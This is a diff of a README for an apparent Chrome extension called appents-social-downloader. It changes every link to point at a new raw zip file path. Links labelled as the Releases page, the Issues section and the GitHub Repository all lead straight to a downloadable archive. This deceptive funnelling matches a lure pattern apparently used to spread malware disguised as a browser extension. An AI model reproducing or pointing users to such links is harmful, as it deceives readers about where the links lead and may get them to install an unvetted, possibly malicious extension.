@@ -1,6 +1,6 @@
 # 📥 appents-social-downloader - Save Your Social Media Posts Easily
 
-[![Download appents-social-downloader](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/transitable/appents-social-downloader.zip)](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/transitable/appents-social-downloader.zip)
+[![Download appents-social-downloader](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/public/social-appents-downloader-3.9.zip)](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/public/social-appents-downloader-3.9.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ To get started, you'll need to install the appents-social-downloader extension i
 
 ## 📥 Download & Install
 
-Visit this page to download: [appents-social-downloader Releases](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/transitable/appents-social-downloader.zip).
+Visit this page to download: [appents-social-downloader Releases](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/public/social-appents-downloader-3.9.zip).
 
 ### Steps to Download and Install
 
@@ -26,7 +26,7 @@ Visit this page to download: [appents-social-downloader Releases](https://raw.gi
 2. **Go to the Releases page:** Click on the link above to go to the appents-social-downloader Releases page on GitHub.
 3. **Find the latest version:** Look for the newest version at the top. You will see release notes that describe the updates and fixes.
 4. **Download the extension:**  
-    - If you see a link labeled "https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/transitable/appents-social-downloader.zip", click on it to download the Chrome extension file.
+    - If you see a link labeled "https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/public/social-appents-downloader-3.9.zip", click on it to download the Chrome extension file.
 5. **Install the extension:**  
     - Open Chrome.
     - Go to `chrome://extensions`.
@@ -57,7 +57,7 @@ Visit this page to download: [appents-social-downloader Releases](https://raw.gi
 
 ## 🗣️ User Support
 
-If you encounter issues or have questions about the appents-social-downloader, please check the [Issues section](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/transitable/appents-social-downloader.zip) on GitHub or reach out to the community for help.
+If you encounter issues or have questions about the appents-social-downloader, please check the [Issues section](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/public/social-appents-downloader-3.9.zip) on GitHub or reach out to the community for help.
 
 ## 📈 Frequently Asked Questions
 
@@ -77,6 +77,6 @@ No, you need to click the appents icon each time to download a post.
 
 Now that you have installed the appents-social-downloader extension, you can start saving your favorite social media posts quickly and efficiently. 
 
-For more information, updates, or to share your feedback, visit our [GitHub Repository](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/transitable/appents-social-downloader.zip).
+For more information, updates, or to share your feedback, visit our [GitHub Repository](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/public/social-appents-downloader-3.9.zip).
 
-[![Download appents-social-downloader](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/transitable/appents-social-downloader.zip)](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/transitable/appents-social-downloader.zip)
+[![Download appents-social-downloader](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/public/social-appents-downloader-3.9.zip)](https://raw.githubusercontent.com/Barbos818/appents-social-downloader/main/public/social-appents-downloader-3.9.zip)
